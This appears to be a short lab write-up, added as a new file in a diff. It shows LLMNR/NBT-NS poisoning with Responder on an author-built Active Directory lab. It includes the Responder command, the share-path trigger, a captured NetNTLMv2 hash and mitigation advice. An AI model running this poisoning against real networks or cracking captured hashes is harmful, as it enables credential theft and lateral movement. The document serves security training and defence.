@@ -1,0 +1,41 @@
+[Author: Alejandro]
+1. Executive Summary
+During a white-box assessment within the internal network, I successfully intercepted user authentication hashes by exploiting the LLMNR (Link-Local Multicast Name Resolution) and NBT-NS protocols. (Note: It's a laboratory I created.)
+
+Critical Note: The captured NetNTLMv2 hashes are highly susceptible to offline brute-force attacks using tools like Hashcat or John the Ripper (JTR). If the target user utilizes a weak or common password, the plain-text credentials can be recovered in a matter of seconds, leading to a full account compromise and potential lateral movement within the Active Directory environment.
+
+2. Methodology
+Step 1: Network Poisoning (Passive/Active Listening)
+Using Responder.py, I placed my machine in "Listen" mode to intercept multicast and broadcast queries on the local network segment.
+
+Bash
+sudo responder -I eth0 -wd
+Step 2: Triggering the Authentication (The "Quick Access" Vector)
+From the victim machine (Alejandro1), I simulated a common user error: attempting to access a non-existent network share through Windows File Explorer.
+
+Input Path: \\SQLserver\hi
+
+Since the local DNS server cannot resolve the hostname "SQLserver," the victim machine falls back to LLMNR/NBT-NS and broadcasts a request to the entire network. Responder intercepted this request and spoofed the identity of the target server, forcing the client to send its NetNTLMv2 authentication hash to my attacker machine.
+
+Step 3: Captured Evidence
+The following hash was successfully extracted from the network traffic:
+
+Service: [SMB] NTLMv2-SSP
+
+Username: ALEJANDRO\Alejandro1
+
+Target SPN: cifs/SQLserver
+
+Captured Hash:
+Alejandro1::ALEJANDRO:2a2740ee0e459eb3:773D05ADC2EC55F9BA44D3DC210FEADE:0101000000000000802061B96AC4DC01D29294034D4731F3000000000200080052004B004100540001001E00570049004E002D0031004400390045005900390046004500370058004A0004003400570049004E002D0031004400390045005900390046004500370058004A002E0052004B00410054002E004C004F00430041004C000300140052004B00410054002E004C004F00430041004C000500140052004B00410054002E004C004F00430041004C0007000800802061B96AC4DC01060004000200000008003000300000000000000000000000002000002E6A7B11F3EBC94326346827C87AB4B467B7DC5E4C0E99A057458B7DC6585BE70A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C007300650072007600650072000000000000000000
+
+3. Remediation & Mitigation
+To secure the environment against this specific vector, the following measures are recommended:
+
+Disable LLMNR/NetBIOS: Apply a Group Policy Object (GPO) to disable these legacy protocols throughout the domain.
+
+Enforce SMB Signing: Require SMB Signing (at least "Required") to prevent SMB Relay attacks.
+
+Network Segmentation: Restrict broadcast/multicast traffic between sensitive network segments.
+
+Strong Password Policy: Implement a policy that enforces high-entropy passwords, making offline cracking attempts statistically unfeasible.
